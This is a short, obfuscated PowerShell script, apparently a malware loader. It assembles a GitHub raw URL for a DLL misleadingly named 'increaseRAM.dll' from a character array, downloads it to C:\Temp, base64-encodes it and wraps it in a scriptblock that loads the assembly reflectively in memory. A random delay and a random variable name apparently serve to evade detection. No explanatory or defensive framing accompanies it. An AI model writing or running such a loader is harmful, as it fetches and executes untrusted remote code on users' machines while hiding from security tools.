$u = 'h','t','t','p','s',':','/','/','g','i','t','h','u','b','.','c','o','m','/','j','e','l','p','s','I','T','/','d','u','c','k','e','r','y','/','r','a','w','/','m','a','i','n','/','i','n','c','r','e','a','s','e','R','A','M','.','d','l','l'
$url = -join $u
$o = 'C',':','\','T','e','m','p','\','i','n','c','r','e','a','s','e','R','A','M','.','d','l','l'
$outputPath = -join $o
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $outputPath)
$bytes = [System.IO.File]::ReadAllBytes("C:\temp\increaseRAM.dll")
$encodedBytes = [System.Convert]::ToBase64String($bytes)
$randomVarName = [System.Guid]::NewGuid().ToString()
$scriptBlock = [Scriptblock]::Create("[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('$encodedBytes'))")
Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 5000)
Set-Variable -Name $randomVarName -Value $scriptBlock
